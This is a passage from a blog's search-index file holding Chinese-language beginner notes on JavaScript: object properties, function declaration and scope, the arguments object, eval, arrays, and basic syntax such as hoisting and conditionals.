punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ['key1', 'key2']</span></code></pre><h4 id="属性的删除：delete命令"><a href="#属性的删除：delete命令" class="headerlink" title="属性的删除：delete命令"></a>属性的删除：delete命令</h4><p><strong>delete命令用于删除对象的属性，删除成功后返回true。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>p<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>undefined<span class="token operator">></span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">[</span> <span class="token string">'p'</span> <span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">delete</span> obj<span class="token punctuation">.</span>p<span class="token boolean">true</span><span class="token operator">></span> obj<span class="token punctuation">.</span>pundefined<span class="token operator">></span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><h4 id="属性是否存在：in运算符"><a href="#属性是否存在：in运算符" class="headerlink" title="属性是否存在：in运算符"></a>属性是否存在：in运算符</h4><p><strong>in运算符用于检查对象是否包含某个属性（检查的是键名，不是键值），如果包含则返回true。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>p<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>undefined<span class="token operator">></span> <span class="token string">'p'</span> <span class="token keyword">in</span> obj<span class="token boolean">true</span><span class="token operator">></span> <span class="token string">'toString'</span> <span class="token keyword">in</span> obj<span class="token boolean">true</span></code></pre><p><strong>你会发现对象并无toString属性，但是返回的却是true。说明这个属性是继承的。</strong></p><p><strong>这是我们可以使用hasOwnProperty方法判断，是否对象是否是自身属性。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'toString'</span> <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'toString'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token boolean">false</span></code></pre><h4 id="属性的遍历：for…in循环"><a href="#属性的遍历：for…in循环" class="headerlink" title="属性的遍历：for…in循环"></a>属性的遍历：for…in循环</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'键名：'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'键值：'</span><span class="token punctuation">,</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 键名： a</span><span class="token comment" spellcheck="true">// 键值： 1</span><span class="token comment" spellcheck="true">// 键名： b</span><span class="token comment" spellcheck="true">// 键值： 2</span><span class="token comment" spellcheck="true">// 键名： c</span><span class="token comment" spellcheck="true">// 键值： 3</span></code></pre><ul><li><strong>它遍历的是对象所有可遍历的属性，会跳过不可遍历的属性。</strong></li><li><strong>它不仅遍历对象自身的属性，还好遍历继承的属性。</strong></li></ul><h4 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">with</span><span class="token punctuation">(</span>对象<span class="token punctuation">)</span> <span class="token punctuation">{</span>    代码块<span class="token punctuation">}</span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><h4 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h4><blockquote><h5 id="JavaScript有三种声明函数的方法。"><a href="#JavaScript有三种声明函数的方法。" class="headerlink" title="JavaScript有三种声明函数的方法。"></a>JavaScript有三种声明函数的方法。</h5></blockquote><p><strong>(1)function命名</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">函数名称</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span> <span class="token punctuation">{</span>    代码块<span class="token punctuation">}</span></code></pre><p><strong>(2)函数表达式(变量赋值)</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> 变量名称 <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span> <span class="token punctuation">{</span>    代码块<span class="token punctuation">}</span><span class="token punctuation">;</span>执行时<span class="token function">变量名称</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>这种方法将一个匿名函数赋值给变量，这是，这个匿名函数又称之为函数表达式。</strong>    </p><p><strong>(3)Function构造函数</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> add <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span>    <span class="token string">'x'</span><span class="token punctuation">,</span>    <span class="token string">'y'</span><span class="token punctuation">,</span>    <span class="token string">'return x+y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>等同于<span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">+</span>y<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="函数的重复声明"><a href="#函数的重复声明" class="headerlink" title="函数的重复声明"></a>函数的重复声明</h4><p><strong>如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。</strong></p><h4 id="圆括号运算符，return语句和递归"><a href="#圆括号运算符，return语句和递归" class="headerlink" title="圆括号运算符，return语句和递归"></a>圆括号运算符，return语句和递归</h4><p><strong>调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数。</strong></p><h4 id="第一等公民"><a href="#第一等公民" class="headerlink" title="第一等公民"></a>第一等公民</h4><blockquote><p>由于函数与其他数据类型的地位平等，所以在JavaScript中称函数为第一公民。</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 将函数赋值给一个变量</span><span class="token keyword">var</span> operator <span class="token operator">=</span> add<span class="token punctuation">;</span></code></pre><h4 id="函数名的提升"><a href="#函数名的提升" class="headerlink" title="函数名的提升"></a>函数名的提升</h4><p><strong>JavaScript引擎将函数名视同变量名，所以采用function命令声明函数时，整个函数将会像变量声明一样，被提升到代码头部。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>不报错</code></pre><p><strong>若采用其他的声明方式，下面则会报错。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>报错</code></pre><h3 id="函数的属性和方法"><a href="#函数的属性和方法" class="headerlink" title="函数的属性和方法"></a>函数的属性和方法</h3><h4 id="name属性"><a href="#name属性" class="headerlink" title="name属性"></a>name属性</h4><p><strong>函数的name返回函数名</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>undefined<span class="token operator">></span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>nameTypeError<span class="token punctuation">:</span> Cannot read property <span class="token string">'name'</span> <span class="token keyword">of</span> undefined<span class="token operator">></span> test<span class="token punctuation">.</span>name<span class="token string">'test'</span></code></pre><h4 id="length属性-1"><a href="#length属性-1" class="headerlink" title="length属性"></a>length属性</h4><p><strong>函数length属性返回函数预期传入的参数个数。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>undefined<span class="token operator">></span> test<span class="token punctuation">.</span>length<span class="token number">3</span></code></pre><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p><strong>函数的toString方法返回一个字符串，内容是函数的源码。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> test<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'function test(a,b,c) {}'</span></code></pre><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><blockquote><p>作用域指的是变量存在的范围。JavaScript只有两种作用域：一种是全局作用域；另一种是函数作用域。</p></blockquote><p><strong>对于顶层函数来说，函数外部声明的变量就是全局变量，它可以在函数内部读取。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span>  <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>在函数内部定义的变量，外部无法读取，称之为“局部变量”。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> v <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>v</code></pre><h4 id="函数内部的变量提升"><a href="#函数内部的变量提升" class="headerlink" title="函数内部的变量提升"></a>函数内部的变量提升</h4><p><strong>与全局作用域一样，函数作用域内部也会产生“变量提升现象”。var 命令声明的变量，不管在上面位置，变量声明都会被提升到函数的头部。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> tmp <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 等同于</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> tmp<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    tmp <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="函数本身的作用域"><a href="#函数本身的作用域" class="headerlink" title="函数本身的作用域"></a>函数本身的作用域</h4><p><strong>函数也是一个值，也有自己的作用域，它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。</strong></p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h4><blockquote><p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数。</p></blockquote><h4 id="参数的省略"><a href="#参数的省略" class="headerlink" title="参数的省略"></a>参数的省略</h4><blockquote><p>函数的参数不是必须的</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token operator">></span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token operator">></span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token operator">></span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>undefined</code></pre><h4 id="传递方式"><a href="#传递方式" class="headerlink" title="传递方式"></a>传递方式</h4><p><strong>函数内部修改参数值，不影响外部值。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>  p <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token comment" spellcheck="true">// 2</span></code></pre><h4 id="同名参数"><a href="#同名参数" class="headerlink" title="同名参数"></a>同名参数</h4><p><strong>如果有同名参数，则取最后出现的那个参数。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 2</span></code></pre><h4 id="arguments对象"><a href="#arguments对象" class="headerlink" title="arguments对象"></a>arguments对象</h4><blockquote><p>由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是<code>arguments</code>对象的由来。</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>one<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1</span><span class="token comment" spellcheck="true">// 2</span><span class="token comment" spellcheck="true">// 3</span></code></pre><p><strong>正常模式下，argument对象可以进行修改。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>  arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 5</span></code></pre><h5 id="与数组的关系"><a href="#与数组的关系" class="headerlink" title="与数组的关系"></a>与数组的关系</h5><p><strong>需要注意的是，虽然<code>arguments</code>很像数组，但它是一个对象。数组专有的方法（比如<code>slice</code>和<code>forEach</code>），不能在<code>arguments</code>对象上直接使用。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> args <span class="token operator">=</span> Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>slice<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 或者</span><span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  args<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h5 id="callee属性"><a href="#callee属性" class="headerlink" title="callee属性"></a>callee属性</h5><p><strong>返回它所对应的函数</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee <span class="token operator">===</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span></code></pre><h3 id="函数的其他知识点"><a href="#函数的其他知识点" class="headerlink" title="函数的其他知识点"></a>函数的其他知识点</h3><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><h4 id="立即调用函数表达式"><a href="#立即调用函数表达式" class="headerlink" title="立即调用函数表达式"></a>立即调用函数表达式</h4><h3 id="eval命令"><a href="#eval命令" class="headerlink" title="eval命令"></a>eval命令</h3><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p><strong>eval命令接受一个字符串作为参数，并将这个字符串当语句执行。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'var a = 1;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a <span class="token comment" spellcheck="true">// 1</span></code></pre><h4 id="eval的别名调用"><a href="#eval的别名调用" class="headerlink" title="eval的别名调用"></a>eval的别名调用</h4><p><strong>JavaScript 的标准规定，凡是使用别名执行<code>eval</code>，<code>eval</code>内部一律是全局作用域。</strong></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p><strong>数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。</strong></p><pre class=" language-javasc"><code class="language-javasc">var arr = ['a', 'b', 'c'];</code></pre><h3 id="数组的本质"><a href="#数组的本质" class="headerlink" title="数组的本质"></a>数组的本质</h3><p><strong>本质上，数组属于一种特殊的对象。<code>typeof</code>运算符会返回数组的类型是<code>object</code>。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">typeof</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// "object"</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// ["0", "1", "2"]</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptの基本语法</title>
      <link href="/2019/06/05/javascript-ji-ben-yu-fa/"/>
      <url>/2019/06/05/javascript-ji-ben-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScriptの基本语法"><a href="#JavaScriptの基本语法" class="headerlink" title="JavaScriptの基本语法"></a>JavaScriptの基本语法</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><blockquote><p><strong>JavaScript我理解为行语句，一行一行执行。很像Java都需要以”;”结尾。</strong></p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></code></pre><p><strong>很好理解，var是声明变量；a则是变量名；1则是将值赋值给变量a。引用变量a就会得到数值1.</strong></p><p><strong>设置变量并不一定需要var来声明。当你没有使用var时，其实你已经创建了一个全局变量。</strong></p><p><strong>注：当已经存在的变量时再次被声明时，后面的声明是无效的。</strong></p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><blockquote><h4 id="JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。"><a href="#JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。" class="headerlink" title="JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。"></a>JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。</h4></blockquote><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><blockquote><h4 id="标识符-identifier-指的是识别各种值得合法名称。"><a href="#标识符-identifier-指的是识别各种值得合法名称。" class="headerlink" title="标识符(identifier)指的是识别各种值得合法名称。"></a>标识符(identifier)指的是识别各种值得合法名称。</h4></blockquote><ul><li><strong>第一个字符，可以是任意的Unicode字母，以及($),(_)</strong></li><li><strong>第二个字符及后面的字符，除了Unicode字母，美元符号，下划线还可以是数字。</strong></li></ul><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><blockquote><h4 id="被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。"><a href="#被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。" class="headerlink" title="被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。"></a>被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。</h4></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 这是单行注释</span><span class="token comment" spellcheck="true">/* 这是多行注释 */</span></code></pre><h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><blockquote><h4 id="JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”-block"><a href="#JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”-block" class="headerlink" title="JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”(block)"></a>JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”(block)</h4></blockquote><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件语句，获得bool值<span class="token punctuation">)</span> <span class="token punctuation">{</span>       为<span class="token boolean">true</span>时执行代码块<span class="token punctuation">}</span>eles <span class="token punctuation">{</span>    为<span class="token boolean">false</span>时执行代码块<span class="token punctuation">}</span></code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件语句，获得bool值<span class="token punctuation">)</span><span class="token punctuation">{</span>    为<span class="token boolean">true</span>执行<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>上面为<span class="token boolean">false</span>时，判断条件语句<span class="token punctuation">)</span><span class="token punctuation">{</span>    为<span class="token boolean">true</span>执行，为<span class="token boolean">false</span>继续往下执行<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>继续判断条件语句<span class="token punctuation">)</span><span class="token punctuation">{</span>    为<span class="token boolean">true</span>执行<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    上述都不满足条件时执行。<span class="token punctuation">}</span></code></pre><h4 id="switch结构"><a href="#switch结构" class="headerlink" title="switch结构"></a>switch结构</h4><blockquote><h5 id="当我们多个if…else…时，也许使用switch更方便"><a href="#当我们多个if…else…时，也许使用switch更方便" class="headerlink" title="当我们多个if…else…时，也许使用switch更方便"></a>当我们多个if…else…时，也许使用switch更方便</h5></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">switch</span> <span class="token punctuation">(</span>xxx<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">"xxx"</span><span class="token punctuation">:</span>        xxxxxxx        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">"xxxx"</span><span class="token punctuation">:</span>        xxxxxxx        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        xxxxxx<span class="token punctuation">}</span></code></pre><p><strong>记得在每个case下面接break，不然执行完会继续跳到下个case。需使用break进行跳出switch。</strong></p><p><strong>switch语句部分和case语句部分都可以使用正则表达式。</strong></p><h4 id="三元运算符？："><a href="#三元运算符？：" class="headerlink" title="三元运算符？："></a>三元运算符？：</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token operator">?</span> 表达式<span class="token number">1</span> ： 表达式</code></pre><p><strong>示例：</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> even <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span></code></pre><p><strong>下面是if..else..示例</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> even<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    even <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token 